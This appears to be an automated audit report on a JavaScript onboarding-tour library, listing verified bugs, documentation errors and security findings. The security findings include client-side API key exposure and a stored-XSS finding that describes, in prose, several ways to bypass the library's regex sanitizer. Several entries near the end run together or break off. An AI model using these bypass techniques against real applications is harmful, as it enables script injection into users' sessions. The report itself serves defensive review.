method: 10 parallel dimension audits + adversarial per-dimension verification + completeness critic (21 agents); 3 findings refuted and dropped

findings.title: clickThrough is broken — an inline pointer-events style set by show() always beats the .gf-clickthrough class
findings.evidence:
this._overlayEl.style.opacity = '1'
    this._overlayEl.style.pointerEvents = 'all'
findings.impact: `setClickThrough(true)` (line 113-120) only adds a class whose rule is `[data-gf-overlay].gf-clickthrough { pointer-events: none; }` (lines 20-22). Inline styles beat any non-`!important` stylesheet rule, and `_ensureElements()` re-applies `pointerEvents = 'all'` on every `show()`. `TourEngine._renderCurrentStep` calls them in exactly that order — `packages/core/src/engine/tour.ts:245` `this._spotlight.show(target, …)` then line 249 `this._spotlight.setClickThrough(step.clickThrough ?? false)` — so the inline `all` is written first and never cleared. A step declared with `clickThrough: true` still has a full-viewport transparent div intercepting every pointer event; the user cannot click the very element the step is telling them to click, and because `dismissOnBackdropClick` defaults to true (line 61) their click instead skips the tour. The documented interactive-step feature in apps/docs/guide/spotlight-popover.md has never worked.
findings.fix: In `setClickThrough`, set `this._overlayEl.style.pointerEvents = enabled ? 'none' : 'all'` directly rather than relying on the class, or stop writing the inline value in `_ensureElements()` and let the stylesheet own it. Add a unit test asserting `getComputedStyle(overlay).pointerEvents === 'none'` after a `clickThrough: true` step renders.
findings.verifierNote: spotlight.ts:165-166 verbatim inside _ensureElements(), which show() calls on every step (line 81) — inline `pointerEvents='all'` beats the non-!important `[data-gf-overlay].gf-clickthrough { pointer-events:none }` at 20-22, and setClickThrough (113-120) only toggles the class. tour.ts:245 show() then :249 setClickThrough confirms the ordering. One impact clause is WRONG: the backdrop click does NOT skip the tour, because the click handler at 139-143 explicitly bails when the element `classList.contains('gf-clickthrough')`. The headline defect (documented interactive steps cannot be interacted with) reproduces independently.

findings.title: Per-instance i18n is entirely non-functional — both renderers read the module-level defaultI18n singleton
findings.evidence:
private _buildHTML(step: Step, content: StepContent, index: number, total: number): string {
    const i18n = defaultI18n
findings.impact: `createGuideFlow()` builds a fresh registry per instance — `packages/core/src/index.ts:162: const i18n = new I18nRegistry()` — and exposes it as `instance.i18n`. But every rendered string (`i18n.t('prev')`, `i18n.t('next')`, `i18n.t('done')`, `i18n.t('close')`, `i18n.t('skip')`, `i18n.t('stepOf', …)` at lines 163-185) resolves against the imported `defaultI18n` singleton from line 8, which nothing ever writes to. `packages/react/src/components/GuidePopover.tsx:49` does the same: `const i18n = defaultI18n`. Consequently `gf.i18n.register('fr', …); gf.i18n.use('fr')` has zero effect on the UI — the popover renders "Next"/"Back"/"Skip tour"/"Step 2 of 5" in English forever. The project's own demo relies on this: `apps/demo/src/main.tsx:29-46` registers fr/es/zh and `apps/demo/src/App.tsx:214` runs `gf.i18n.use(locale)`, so the demo's language switcher only updates the string table it prints on screen while the actual tour stays English. Every non-English deployment of this library is broken. `packages/core/src/__tests__/i18n.test.ts` tests the registry in isolation and never wires one to a renderer, which is why nothing caught it.
findings.fix: Pass the instance registry into the renderer: add an `i18n` field to `GuideFlowConfig`/`RendererContract.onInit`, store it in `DefaultRenderer._config`, and use `this._config?.i18n ?? defaultI18n` in `_buildHTML`. For React, read the registry off the instance from `useGuideFlow()` (`gf.i18n`) instead of importing `defaultI18n`, and re-render the popover when `use()` is called (add a change listener to `I18nRegistry`).
findings.verifierNote: default-renderer.ts:157 `const i18n = defaultI18n` verbatim, with `defaultI18n` imported at line 8 from i18n/index.js (module singleton, line 64). index.ts:162 `const i18n = new I18nRegistry()` exposed at line 316 as `instance.i18n` — a different object nothing writes to the singleton from. GuidePopover.tsx:49 is identical. Demo confirms the trap: main.tsx registers fr/es/zh on `gf.i18n` and App.tsx:214 `useEffect(() => { gf.i18n.use(locale) }, [gf, locale])` — verified at that exact line. i18n.test.ts never wires a registry to a renderer. Headline feature dead in both renderers; P0 stands.

findings.title: Popover positioning mixes viewport-relative and page-relative coordinates, throwing the popover off-screen on any scrolled page
findings.evidence:
const targetRect = target.getBoundingClientRect()
    const viewport = getViewportRect()
findings.impact: `getBoundingClientRect()` is viewport-relative (origin = top-left of the visible area) but `getViewportRect()` returns page coordinates — `packages/core/src/engine/popover.ts:155-158: x: window.scrollX, y: window.scrollY`. `computePosition` then runs `fitsInViewport` (popover.ts:75-82), which requires `pos.y >= viewport.y`, i.e. `pos.y >= window.scrollY`. Once the page is scrolled — which `TourEngine` guarantees, since it calls `scrollTargetIntoView(target)` at tour.ts:236 before positioning — every candidate placement fails the fit test, the loop exhausts, and control falls to `clampToViewport` (popover.ts:118-121), which returns `y = max(scrollY + 8, …)`. That value is written to `el.style.top` on an element whose CSS is `position: fixed` (line 26). On a page scrolled 2000px, the popover is placed at `top: 2008px` in fixed coordinates — completely off-screen. The user sees a spotlight cutout with no popover and no way to advance except arrow keys. `packages/react/src/components/GuidePopover.tsx:84-96` has the identical defect. The unit tests in `packages/core/src/__tests__/popover.test.ts` pass an explicit `{x:0,y:0}` viewport, so they never exercise the scrolled case.
findings.fix: Make the coordinate systems agree: since both popovers are `position: fixed`, `computePosition` should be given a viewport of `{ x: 0, y: 0, width: innerWidth, height: innerHeight }`. Either change `getViewportRect()` to return zeros for x/y (and rename `getAbsoluteRect` users accordingly) or subtract the scroll offset before calling. Add a test that scrolls the document and asserts the resulting top/left fall inside `[0, innerHeight]`.
findings.verifierNote: Reproduced the full chain: default-renderer.ts:212-220 passes viewport-relative `getBoundingClientRect()` values together with `getViewportRect()`, which returns `{x: window.scrollX, y: window.scrollY, ...}` (popover.ts:154-158). fitsInViewport (75-82) requires `pos.y >= viewport.y`, so with scrollY=2000 every candidate (y in viewport coords, ~350) fails; the loop exhausts and clampToViewport (84-90) returns `y = max(scrollY+8, ...)` = 2008, written to `style.top` on a `position:fixed` element (CSS line 26). GuidePopover.tsx:84-96 is identical. popover.test.ts:7 uses `{x:0,y:0,width:1280,height:800}` so the scrolled case is never exercised. Breaks on any scrolled page, and tour.ts:236 scrolls before positioning.

findings.title: apps/docs/api/react/guide-popover.md documents three props that do not exist and claims the component works without TourProvider, which throws
findings.impact: `GuidePopoverProps` (GuidePopover.tsx:13-22) accepts exactly `width?: number`, `children?`, and `className?: string`. `target`, `placement` and `content` are all rejected by TypeScript and ignored at runtime. Worse, line 41 of this page asserts "Can be used without `TourProvider`", but GuidePopover.tsx:45 calls `const gf = useGuideFlow()` which throws `'[GuideFlow] useGuideFlow must be used inside a <TourProvider>'` (context.tsx:48). Every consumer following the documented "standalone popover / one-off tooltip outside of a tour context" use case gets an unrecoverable render-time exception.
findings.fix: Either implement the documented standalone mode (accept `target`/`placement`/`content` props, use `useContext(GuideFlowContext)` instead of the throwing `useGuideFlow()`, and fall back to prop-driven rendering when there is no provider), or rewrite the page to document the real tour-bound `{ width, className, children }` API and delete the "Can be used without TourProvider" and "scroll tracking" claims.
findings.verifierNote: guide-popover.md:17-24 passes target/placement/content verbatim and the props table (lines 33-35) lists all three; GuidePopoverProps (GuidePopover.tsx:13-22) declares only width?/children?/className?. guide-popover.md:41 says "Can be used without `TourProvider`" while GuidePopover.tsx:45 calls useGuideFlow(), which throws '[GuideFlow] useGuideFlow must be used inside a <TourProvider>' at context.tsx:48. Both halves reproduce exactly as cited.

findings.title: apps/docs/api/react/tour-step.md documents a component that does not exist — <TourStep /> with no props, described as the popover renderer
findings.evidence:
<TourProvider instance={gf}>
      <TourStep />
      <YourApp />
    </TourProvider>
findings.impact: The shipped component is `export function TourStep({ id, children }: TourStepProps)` where `id: string` is required and the body is `if (!isActive || !children) return null` — it renders nothing but its own children when the matching step is active. It never renders a popover, never touches the spotlight, and never wires next/prev/skip buttons, all of which this page claims under "## Behavior" ("Positions the popover relative to the current step's target element", "Manages the spotlight overlay", "Handles next/prev/skip button actions"). A user copying this page gets a TypeScript error (`Property 'id' is missing`) and, if they cast past it, a component that renders `null` forever — so they conclude GuideFlow's React support is broken.
findings.fix: Rewrite apps/docs/api/react/tour-step.md to document the real `{ id, children }` render-prop gate, and move the "renders the popover / manages the spotlight" description to the DefaultRenderer / GuidePopover pages. Also fix the same wrong one-liner in packages/react/README.md ("`TourStep` | Renders the current tour step popover") and apps/docs/packages/react.md ("`TourStep` | Component | Step renderer").
findings.verifierNote: apps/docs/api/react/tour-step.md:18-19 shows `<TourStep />` with no props inside TourProvider, and lines 27-31 claim it positions the popover, manages the spotlight and handles next/prev/skip. The shipped component is `export function TourStep({ id, children }: TourStepProps)` (TourStep.tsx:30) with required `id: string` (line 15) and `if (!isActive || !children) return null` (line 43) — it renders only its own children, never a popover, spotlight or buttons. Both the missing-prop TS error and the render-null-forever outcome reproduce.

findings.title: The Svelte API doc's headline example uses $tour on a plain object — a Svelte compile error, duplicated in the source JSDoc
findings.evidence:
{#if $tour.isActive}

Step {$tour.currentStepIndex + 1} of {$tour.totalSteps}
findings.impact: `createTourStore()` returns a `TourStore` — a plain object whose *fields* are stores (`isActive: { subscribe: _isActive.subscribe }`, index.ts:88-91). The object itself has no `subscribe` method, so the Svelte compiler rejects `$tour` with "'tour' is not a store with a 'subscribe' method". The only correct form is destructuring first (`const { isActive } = tour` then `$isActive`), which is what README.md:222 and apps/docs/guide/svelte.md:47 do — so the two doc sets contradict each other and the canonical API reference is the broken one. The same broken pattern is baked into the exported JSDoc at packages/svelte/src/index.ts:59, which additionally has a malformed closing tag: `{#if $tour.isActive}Step {$tour.currentStepIndex + 1}</>`.
findings.fix: Rewrite the example in apps/docs/api/svelte/create-tour-store.md (lines 60-73) and the JSDoc in packages/svelte/src/index.ts (lines 52-60) to destructure the readables before `$`-subscribing, and fix the stray `</>`. Optionally add a top-level `subscribe` to `TourStore` (a derived store of all four scalars) so `$tour.isActive` actually becomes legal.
findings.verifierNote:
create-tour-store.md:67-68 is verbatim `{#if $tour.isActive}` / `

Step {$tour.currentStepIndex + 1} of {$tour.totalSteps}

`, and createTourStore returns an object literal (index.ts:87-106) whose fields are stores — `isActive: { subscribe: _isActive.subscribe }` at line 88 — with no top-level subscribe, so `$tour` is a Svelte compile error. The exported JSDoc at packages/svelte/src/index.ts:59 does carry the same broken pattern plus the malformed ``. Root README.md and apps/docs/guide/svelte.md both use the destructured `$isActive` form, confirming the contradiction. Bonus: the same page's line 62 also passes `{ theme: 'bold' }`, which GuideFlowConfig (core types/index.ts:234-248) does not accept.

findings.title: <GuidePopover> renders a second popover on top of core's DefaultRenderer — two stacked aria-modal dialogs
findings.evidence:
* @example
 * ```tsx
 * <TourProvider config={...}>
 *   <App />
 *   <GuidePopover />
 * </TourProvider>
 * ```
findings.impact: core/src/index.ts:161 installs the themed DOM renderer unconditionally: `const renderer = (config.renderer ?? new DefaultRenderer()) as DefaultRenderer`. DefaultRenderer.renderStep() creates its own `div.gf-popover` with `role="dialog" aria-modal="true"`, appends it to document.body and steals focus (`firstFocusable?.focus()`, default-renderer.ts:125). Following GuidePopover's own JSDoc therefore paints TWO visually identical popovers at the same computed position for every step, with two `aria-modal="true"` dialogs in the a11y tree, and focus jumping into the core one while the React one holds the click handlers the user thinks they configured. Nothing in the React package, its README, or apps/docs tells the user to suppress the default renderer, and there is no documented no-op renderer to pass.
findings.fix: Export a `NullRenderer` (or a `headless: true` config flag) from @guideflow/core and have `<GuidePopover>` assert on mount that `gf` was constructed with it — warn loudly otherwise. Update the JSDoc example and apps/docs/api/react/guide-popover.md to show `createGuideFlow({ renderer: new NullRenderer() })`. Simplest alternative: make `<GuidePopover>` call `gf.configure({ renderer: nullRenderer })` in a layout effect on mount and restore on unmount.
findings.verifierNote: Verified end to end. core/src/index.ts:161 is verbatim `const renderer = (config.renderer ?? new DefaultRenderer()) as DefaultRenderer`, and DefaultRenderer._ensurePopover() (renderer/default-renderer.ts:147-154) creates `div.gf-popover` and appends it to document.body; renderStep() sets role=dialog/aria-modal=true (lines 94-95) and calls `firstFocusable?.focus()` (line 125). GuidePopover.tsx:120-137 portals a second `div.gf-popover` with role=dialog aria-modal=true into document.body at the same computed position. I searched for an escape: there is no no-op/headless renderer exported anywhere (`grep -rn "Headless|NoopRenderer|headless"` hits only two comments), TourProvider passes no renderer, and the JSDoc at GuidePopover.tsx:36-42 is quoted verbatim and does not tell the user to supply one. Two stacked dialogs confirmed.

findings.title: Every documented example instructs users to embed their OpenAI/Anthropic API key in client-side code
findings.evidence: new OpenAIProvider({ apiKey: import.meta.env.VITE_OPENAI_KEY }),
findings.impact: `VITE_`-prefixed env vars are inlined into the client bundle by Vite by design, so this pattern publishes a live provider secret to every visitor. The same pattern appears in README.md:248, apps/docs/guide/ai-generate.md:17, apps/docs/guide/ai-intent.md:17, apps/docs/guide/ai-chat.md:37, and apps/docs/api/ai/create-ai.md:43 — there is no server-proxy example anywhere and no warning. The provider code reinforces it: `apiKey: opts.apiKey ?? (typeof process !== 'undefined' ? process.env['OPENAI_API_KEY'] ?? '' : '')` (openai.ts:36) is bundler-inlined in webpack/Vite builds too, so even the env-var path leaks. Anyone shipping the documented snippet has their key scraped and billed against.
findings.fix: Delete the `import.meta.env.VITE_*` pattern from all six docs locations. Document a server-side proxy as the only supported browser deployment: expose `OllamaProviderOptions`-style `baseUrl` on the OpenAI/Anthropic providers so callers can point at their own authenticated endpoint, and add a prominent warning block to apps/docs/guide/ai.md stating that provider keys must never reach the browser. Consider throwing from the constructors when a key is supplied in a browser context without an explicit `dangerouslyAllowBrowser`-style opt-in.
findings.verifierNote: apps/docs/guide/ai.md:29 is verbatim. Same VITE_-inlined pattern at README.md:249, ai-generate.md:17, api/ai/create-ai.md:43, and api/ai/providers.md:30. openai.ts:36 process.env fallback verified verbatim. Grep across packages/ai/src and apps/docs found zero mentions of a proxy, baseURL, privacy, or key handling — and OpenAIProviderOptions/AnthropicProviderOptions expose no baseURL, so there is no server-proxy path even if a user wanted one. Two impact citations are wrong: ai-chat.md:37 and ai-intent.md:17 use a literal `apiKey: '...'` placeholder, not a VITE_ env var — they still construct the provider in browser code, so the claim survives, but those two line cites do not support the 'VITE_ inlining' argument.

findings.title: `guideflow export` on a .ts/.js file never emits a FlowDefinition — it writes a truncated raw string snippet
findings.impact:
The `.ts`/`.js` branch — the primary documented path (apps/docs/guide/quick-start.md:84 `npx @guideflow/cli export my-tour.ts`, and export.ts:19 defaults the argument to `'my-tour.ts'`, which is exactly the file `init` scaffolds) — never parses anything. `match` comes from a single non-greedy regex at line 39 and `match[0]` is sliced to 500 characters, so the output for the scaffolded `my-tour.ts` is `{"_note":"...","rawSnippet":"const welcomeTour: FlowDefinition = {
  id: 'welcome-tour',
  initial: 'step-1',
  states: {"}` — a truncated string, not a flow. It is not round-trippable into a `FlowDefinition` by any consumer: it has no `id`, no `initial`, no `states`. It is then written to `my-tour.flow.json`, which is precisely `push`'s default argument (push.ts:23), so the documented `init -> export -> push` pipeline publishes this stub to the cloud. The stated problem of non-serialisable values (`Step.showIf?: (context: TContext) => boolean` at packages/core/src/types/index.ts:60 and `content: StepContent | (() => MaybePromise<StepContent>)` at line 57) is not "silently lossy" — it is never reached, because nothing is ever serialised. Notably apps/demo/src/App.tsx:796 claims its in-browser exporter "reproduces `guideflow export`" by "replacing function values with `"[Function]"` annotations"; the CLI does no such thing.
findings.fix: Replace the regex with real evaluation: import the module (jiti/tsx/esbuild-register), take the exported `FlowDefinition`, and serialise with a replacer that (a) emits `{"$fn": "showIf", "source": "..."}` markers or drops functions with a named warning listing each lossy field path, and (b) fails loudly if `content` is a function. Validate the result has `id`/`initial`/`states` before writing. Until that exists, make the `.ts`/`.js` branch exit non-zero with "not implemented — write your flow to JSON" rather than writing a file that looks like a successful export (line 63 currently prints a green `✓ Exported flow`).
findings.verifierNote: export.ts:47-50 verbatim; the only .ts/.js processing is the regex at line 39 and `match[0].slice(0,500)`. No parser, no evaluation, no serialisation — so the FlowDefinition-serialisability concern (core/src/types/index.ts:57 `content: StepContent | (() => MaybePromise<StepContent>)`, :60 `showIf?: (context: TContext) => boolean` — both verified verbatim) is indeed never reached. Default argument is 'my-tour.ts' (line 19), which is exactly what init.ts:96 writes, and push.ts:23 defaults to 'my-tour.flow.json' — the pipeline claim holds. Partial mitigation the auditor omitted: line 51-53 prints a yellow `⚠ TypeScript static extraction is limited` warning and the payload carries `_note`, so it is not silent — but it still prints `✓ Exported flow` and writes a non-FlowDefinition. Severity stands: the primary documented export path is non-functional.

findings.title: `guideflow studio` is vaporware: it serves the user's own project with bare Vite and injects a boolean flag nobody reads
findings.impact: The entire command body is a Vite dev server pointed at `resolve(opts.root)` (default `.`) plus a one-line HTML injection. There is no editor bundle, no served asset directory, no HTML/JS for a builder anywhere in the repo. A repo-wide grep for `__GUIDEFLOW_DEVTOOLS__` returns exactly three producers/consumers: this line, and `apps/demo/src/App.tsx:207` (`setStudioActive(w.__GUIDEFLOW_DEVTOOLS__ === true)`) which only flips a status badge. Nothing in `packages/devtools/src/**` reads the flag — the DevTools panel is a Chrome extension loaded via `chrome://extensions`, entirely unrelated to this server. Concretely: a user installs the CLI, runs `guideflow studio` in a project with no `index.html` at root (e.g. the repo's own root script `package.json:23` -> `"studio": "pnpm --filter @guideflow/cli exec guideflow studio"`, which runs it in `packages/cli/`), gets `Studio running at http://localhost:4747`, opens it, and receives a Vite 404 — there is nothing to edit. In a Vite project they get their own app back, unchanged, with one extra global. README.md:534 sells this as "Launch the visual tour editor (opens browser)" and packages/cli/README.md:45 as "the visual tour builder where you can create and edit tours interactively". Neither is true; `open: false` means it does not even open a browser.
findings.fix: Either build the editor or stop claiming it exists. Short term: rename to `guideflow dev`, change its description to "serve your project with the GuideFlow DevTools hook injected", drop "visual tour editor/builder" from README.md:534, packages/cli/README.md:24+45, apps/docs/api/cli.md:46-67, apps/docs/packages/cli.md:23 and apps/docs/guide/index.md:30, and make the command print a warning + exit non-zero when `root` contains no `index.html`. Long term: ship a real editor bundle inside the package (e.g. `packages/cli/studio/` built by tsup/vite) and serve it via a middleware mode server that proxies the user app in an iframe, then wire `packages/devtools/src/panel/app.tsx` (which already has a Builder tab) as the editor host.
findings.verifierNote: studio.ts:24-39 is verbatim: createServer({root: resolve(opts.root), server:{port, open:false}}) plus one transformIndexHtml that injects `window.__GUIDEFLOW_DEVTOOLS__ = true`. `ls packages/cli/src` shows only `commands/` and `index.ts` — no editor bundle, and package.json `files` is [dist, src, README.md], so nothing else could ship. Repo-wide grep for __GUIDEFLOW_DEVTOOLS__ returns exactly 5 hits: studio.ts:34 (producer), apps/demo/src/App.tsx:169/207 (type + `setStudioActive(w.__GUIDEFLOW_DEVTOOLS__ === true)`), and 725/779 (prose). Nothing in packages/devtools reads it. Root package.json `"studio": "pnpm --filter @guideflow/cli exec guideflow studio"` is at line 22, not 23 (harmless off-by-one), and packages/cli has no index.html, so that script does yield a Vite 404. README.md:534 and packages/cli/README.md:45 claims verified verbatim.

findings.title: Completed tours restart (and resume mid-flow) on every page load — start() never checks isCompleted and the snapshot is never marked completed or cleared
findings.evidence:
const snapshot = await progress.loadSnapshot(userId, flow.id)
        if (snapshot && !snapshot.completed) {
findings.impact: Two co-operating defects. (1) `start()` gates on `isDismissed` and on `snapshot.completed` but never calls `progress.isCompleted(userId, flow.id)`, even though `markCompleted` is written on `tour:complete` (index.ts:195-199) — the completed list is write-only inside core. (2) A snapshot with `completed: true` is never written: on the last step `_engineNext()` → `TourEngine._doEnd()` sets `this._machine = null` and `this._flow = null` *before* the wrapper's `_saveProgress()` runs, so `_saveProgress` hits `if (!userId || !flowId) return` (index.ts:325) and returns. `clearSnapshot` is never called by core either (only apps/demo calls it indirectly via `resetUser`). Net effect for every app that sets `context.userId`: a finished tour re-opens on the next page load, resumed at the second-to-last step, forever.
findings.fix: In `start()`, check `await progress.isCompleted(userId, flow.id)` alongside `isDismissed`. On `tour:complete`, `await progress.clearSnapshot(userId, flowId)` (or save a `completed: true` snapshot) — capture `flowId`/`machine.state` before `_doEnd()` nulls them, e.g. by saving progress inside `_doEnd` before the fields are cleared.
findings.verifierNote: index.ts:244-249 verbatim; the only guards are `progress.isDismissed` and `snapshot.completed`. Repo-wide grep shows `isCompleted` is called only in packages/ai/src/brain.ts:223 and progress-store.test.ts — never in core, though markCompleted is written at index.ts:195-199. Traced the last-step write: instance.next() → _engineNext() → TourEngine.next → _doEnd(true) which sets `this._machine = null; this._flow = null` (tour.ts:317-318) BEFORE the wrapper's _saveProgress runs, so `engine.flowId` is null and index.ts:325 returns early — a `completed: true` snapshot is never persisted. grep confirms clearSnapshot has no core caller. So the last stored snapshot is the second-to-last position with completed:false and start() resumes it forever.

findings.title: Steps of any state marked `final: true` are never displayed — tour ends on entry
findings.impact: `isFinal` is checked AFTER the transition, so the moment the FSM enters a state with `final: true` the tour is ended without rendering that state's steps. Two concrete cases: (a) README.md quick start (`states.intro` has 2 steps and `final: true`) shows step-1 then ends on the first Next — step-2 is never shown; (b) apps/docs/guide/flows-and-steps.md's `features` state (`final: true`, 1 step) never displays its step. The same premature end exists in `send()` (tour.ts:143-147). packages/core/src/__tests__/tour-engine.test.ts:95-106 encodes the bug as expected behaviour (3 nexts for a 3-step flow, never asserting step-3 rendered). apps/docs/api/flow-definition.md:59 documents the opposite: "If `true`, the tour ends after this state's steps".
findings.fix: Only end when the machine is final AND there is no renderable step left in that state: in `next()` replace the check with `if (!advanced) { this._doEnd(true); return }` and, after `_renderCurrentStep()`, treat "final state + last stepIndex" as the terminal condition (i.e. end on the *next* `next()` call). Mirror the change in `send()` (tour.ts:143). Add a regression test asserting `renderStep` is called with the final state's step.
findings.verifierNote: tour.ts:116-121 is verbatim: `const advanced = this._machine.nextStep()` then `if (!advanced || this._machine.isFinal) { this._doEnd(true); return }`. Traced README.md quick start (states.intro, 2 steps, `final: true` at README.md:110): start() renders step-1; next() → nextStep() sets stepIndex=1 and returns true, but isFinal is true for `intro` so _doEnd(true) fires and step-2 is never rendered. findings.title: DefaultRenderer mixes page coordinates with client coordinates — every popover collapses to a clamped centre once the page is scrolled
findings.impact: `getViewportRect()` returns PAGE coordinates (`x: window.scrollX, y: window.scrollY` — popover.ts:154-158) while `targetRect.left/top` are CLIENT coordinates. `fitsInViewport` then demands `pos.y >= viewport.y`, i.e. `clientY >= scrollY`. With the page scrolled 600px down, a target at client y=100 yields candidate positions around y≈-112..160, all failing `>= 600`, so every placement in the fallback sequence is rejected and the function returns the clamped-centre branch (popover.ts:119-121) with `y = Math.max(scrollY + 8, ...) = 608`. The popover element is `position: fixed`, so `top: 608px` renders it 608px down the *viewport* — off-screen or wildly misplaced, with `data-placement="center"` and no arrow, on every step of every scrolled page. packages/core/src/__tests__/popover.test.ts only ever passes `{x:0,y:0,...}` viewports, so the mismatch is invisible to the suite.
findings.fix: Pass a client-space viewport to `computePosition` from the renderer: `{ x: 0, y: 0, width: window.innerWidth, height: window.innerHeight }` (or add `getClientViewportRect()`). Keep `getViewportRect()` for consumers doing absolute-page math, and document which space each helper returns. Add a test with a non-zero `viewport.y`.
findings.verifierNote: default-renderer.ts:212-216 verbatim: client-coordinate `targetRect.left/top` passed alongside `getViewportRect()`, which returns `{x: window.scrollX, y: window.scrollY, ...}` (popover.ts:154-158) — page coordinates. fitsInViewport (popover.ts:75-82) requires `pos.y >= viewport.y`, i.e. clientY >= scrollY. Re-checked every fallback including 'center' (popover.ts:67-71) which also returns client-space vh/2 — with scrollY=600 all candidates fail, so control reaches popover.ts:118-121 and clampToViewport returns y = max(scrollY+8, …) = 608. `.gf-popover` is `position: fixed` (default-renderer.ts:26), so 608px is measured from the viewport top. popover.test.ts only ever passes `{x:0,y:0,…}` (lines 7 and 37), so the suite cannot see it.

findings.title: Resume path restores FSM state but leaves the rendered UI on step 0
findings.impact: `_engineStart` already awaited `_renderCurrentStep()`, which rendered index 0 of the initial state and set `_currentStep`/`_currentContent`/spotlight target to step 0. `FlowMachine.restore()` only mutates `_ctx` and notifies FSM subscribers — nothing re-renders. A user who left on step 5 of state `billing` sees step 1 of state `welcome` in the popover and the spotlight over the wrong element, while `currentStepId`, `next()` and `totalSteps` all report the restored position. `machine.restore` also skips `onEntry`/`onExit`, and `new FlowMachine` has already fired `onEntry` for the *initial* state, so state lifecycle hooks run for a state the user is not in. The identical defect applies to the BroadcastSync handler at index.ts:255-257.
findings.fix: Add a public re-render entry point on TourEngine (e.g. `async rerender(): Promise<void> { this._renderGeneration++; await this._renderCurrentStep() }`) and call it after `restore(...)` in both the resume path and the `progress:sync` handler. findings.title: Bridge postMessage of the step:enter payload throws DataCloneError and aborts every targeted tour on the page
findings.impact: Core emits `this.emit('step:enter', { stepId, stepIndex, target })` (packages/core/src/engine/tour.ts:258-262) where `target` is a live `Element` (`_resolveTarget` returns `document.querySelector(step.target)`). `window.postMessage` uses the structured clone algorithm, which cannot clone DOM nodes, so this listener throws `DataCloneError` synchronously. `EventEmitter.emit` (packages/core/src/utils/emitter.ts:33) does `set.forEach((fn) => fn(payload))` with no try/catch, so the throw propagates into TourEngine's `_renderCurrentStep` try block, whose catch runs `this.emit('tour:error', …)` then `this._doEnd(false)` (tour.ts:266-272) — before `this._renderer.renderStep(...)` on line 265 ever executes. Net effect: with the extension installed, any tour step that has a `target` kills the tour instead of rendering, on every page. This is the single most damaging defect in the package and it is reproducible against the repo's own apps/demo, which sets `window.__guideflow`.
findings.fix: In bridge.ts, serialize the payload before posting: deep-clone `args` through a sanitizer that replaces any `Node`/`Element`/`Function` with a descriptor string (e.g. `{ __el: el.tagName + '#' + el.id }`), and wrap the `postMessage` call in try/catch so a clone failure can never escape into the host page's emitter. Add the same guard to the `GF_FLOWS_LIST` and `GF_ACTIVE_TOUR_STATE` posts.
findings.verifierNote: Reproduced end-to-end. bridge.ts:109-114 posts `{event, args}` for every subscribed event. core/src/engine/tour.ts:258-262 emits `step:enter` with `target` from `_resolveTarget` (tour.ts:283-290 returns `document.querySelector(...)`, an Element). utils/emitter.ts:33 is `this._listeners.get(event)?.forEach((fn) => fn(payload))` — no try/catch, so the DataCloneError propagates. The emit sits inside the try opened at tour.ts:225, before `this._renderer.renderStep(...)` at line 265, so the catch at 266-273 emits tour:error and calls `_doEnd(false)`. apps/demo/src/main.tsx:100 sets `window.__guideflow`, and apps/demo/src/flows/onboarding.ts uses targeted steps, so this is reproducible in-repo. (The follow-on `tour:error` payload carries a DOMException, which IS structured-cloneable, so no secondary throw masks it.)

findings.title: Nothing in the entire monorepo handles SPA route changes — multi-page tours are structurally impossible
findings.evidence: return document.querySelector(step.target)
findings.impact: A grep for popstate, pushState, hashchange, the Navigation API, or any router integration across packages/ and apps/ returns zero hits outside a MutationObserver in intro-compat.ts. TourEngine resolves each step's target exactly once via document.querySelector, then waits a fixed 150 ms and renders. A step whose target lives on /settings while the tour started on /dashboard resolves to null and (per silent-missing-target) becomes a full-screen dark modal. Every competitor — Userpilot, Appcues, Pendo, Chameleon, and even react-joyride via its own step lifecycle — supports tours that span route changes; GuideFlow cannot express one. There is also no waitForElement/retry, so a target rendered asynchronously after the 150 ms settle is treated as missing.
findings.fix: Add a navigation-aware target resolver in packages/core/src/engine/tour.ts: poll/MutationObserver with a configurable `waitForTarget` timeout instead of a single querySelector, and add a `navigation` config to GuideFlowConfig that subscribes to popstate + a patched history.pushState/replaceState (or the Navigation API where available) so a step can declare `url`/`urlPattern` and the engine pauses until the route matches. Document the router integration story in apps/docs/guide/.

findings.title: _sanitizeHTML regex denylist is trivially bypassable — stored XSS via step content.html
findings.impact: Every payload below survives `_sanitizeHTML` and lands in `el.innerHTML` at line 93, executing in the host application's origin. (a) Solidus-separated handler: `` — the handler regex requires `\s+` immediately before `on\w+`, but here the preceding character is `/`, so no match; the HTML tokenizer hits the unexpected-solidus-in-tag parse error, reconsumes in before-attribute-name state, and `onerror` becomes a live attribute that fires on the failed image load. (b) Unquoted URL scheme: `Continue` — the scheme filter only matches when the value is wrapped in a double or single quote, so an unquoted value is untouched. (c) Entity-encoded scheme: `Continue` — the regex looks for the literal string `javascript`; the browser decodes the numeric character reference during attribute-value parsing and navigates to a javascript: URL. (d) Unclosed container tags: the script/style/iframe/object/form removals all require a matching close tag, so `` is passed through verbatim — `srcdoc` is not in the (href|src|action) list, the inner script tag is entity-encoded so the script regex cannot see it, and the browser auto-closes the iframe and executes the script in a same-origin about:srcdoc document. Likewise a bare `
findings.fix: Delete `_sanitizeHTML` and stop concatenating untrusted HTML into `innerHTML`. Either (a) require the host app to pass pre-sanitized HTML and rename the field to `unsafeHTML` with a documented "you must sanitize this" contract, or (b) sanitize with the browser's own parser via an allowlist walk: parse with `new DOMParser().parseFromString(html,'text/html')`, then recursively rebuild into a `DocumentFragment` keeping only allowlisted tags (p, span, strong, em, ul, ol, li, br, code, a, img) and allowlisted attributes, resolving every `href`/`src` through `new URL()` and rejecting any scheme not in {http, https, mailto}. Prefer Trusted Types + DOMPurify as a peer dependency if a dependency is acceptable. Update packages/core/src/types/index.ts:36 to stop claiming sanitisation until the guarantee is real, and replace the three-payload test with the bypass corpus above.

The script/style/iframe/object/form strippers all require a matching close tag, so unclosed `

findings.title: step.actions[].action and .variant are interpolated into innerHTML attributes with zero escaping
